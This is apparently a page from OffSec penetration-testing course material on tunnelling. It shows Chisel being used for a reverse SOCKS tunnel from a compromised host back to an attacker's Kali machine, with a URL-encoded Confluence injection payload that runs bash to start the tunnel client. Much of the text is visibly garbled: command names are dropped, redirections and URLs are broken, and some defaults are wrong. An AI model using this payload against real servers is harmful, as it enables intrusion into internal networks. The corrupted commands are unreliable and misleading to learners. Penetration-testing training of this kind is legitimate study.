# OffSec

Penetration Testing with Kali Linux

```
kali@kali:-$ tail -f /var/log/apache2/access.log
```

```
...
192.168.50.63 - [21/Aug/2022:17:41:49 -0400] "GET /HTTP/1.1" 200 8750339 "-
Wget -i/1.2.0.3 (linux-gnu)"
```

Listing 590 - The request for the chisel binary hitting our Apache2 server.

Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On the Kali machine, we will start the server as a server using the server subcommand, along with the bind (--port) and the --reverse flag injection to allow the reverse port forward.

```
kali@kali:-$ server --port 8080 --reverse
2022/07/22 16:43:22 server: Reverse tunelling enabled
2022/07/22 16:43:22 server: Fingerprint mZANuWndvrRnJgBasGQtqbbe0tKKanpoQqJgNy7:
2022/07/22 16:43:22 server: Listening on http://0.0.0.0
```

Listing 591 - Starting the Chisel server on port 8080.

The Chisel server up and confirms that it is listening on port 8080, and has reverse tunelling.

Before we run chisel, we will create the tunnel on our Kali machine to log the chisel traffic. We will capture the traffic using sudo tcpdump tun tcp port 8080 to isolate the chisel traffic.

```
kali@kali:-$ sudo tcpdump tun tun tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
tcpdump: listening to tun0 via tcp/port 8080 through the tun0 interface
```

Next, we will start the chisel from the web shell, using the server address and the port forwarding configuration options on the command line.

We will connect to the server running on our Kali machine (192.168.1.4:8080), creating a reverse SOCKS tunnel (RSocks). The R prefix enables a reverse tunnel using a socks proxy (which is bound to port 10 by default). The remaining shell redirections (> /dev/null 2&1) force the process to run in the background, which will free up our shell.

```
/tmp/chisel client 192.168.1.4:8080 RSocks > /dev/null 2&1
```

Listing 592 - Starting the chisel command from the web shell.

```
kali@kali:-$ curl
http192.168.50.63:8090/%24%28%22java.script.ScriptEngineManager%28%29Engine
Name%28%22hashorn%22%22.eval%28%22java.lang.ProcessBuilder%28%29command%28%27
bash%27%2C%27-
c%27%2C%27/tmp/chiselclients%20192.168.1.4:8080%20socks%27%29.start%28%22%29%27D/
```

We will then create a confluence injection, and connect to CONFLUENCE.

Listing 593 - Starting the chisel client using the confluence injection.

Tcpdump instantly reveals our traffic to the Chisel server, some of which is familiar .

```
kali@kali:-$ sudo tcpdump -nnvv tun0 tcp port 8080
tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
18:53:687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6),
length 276)
```

PWK - Copyright © 2023 OffSec Services. All rights reserved.

618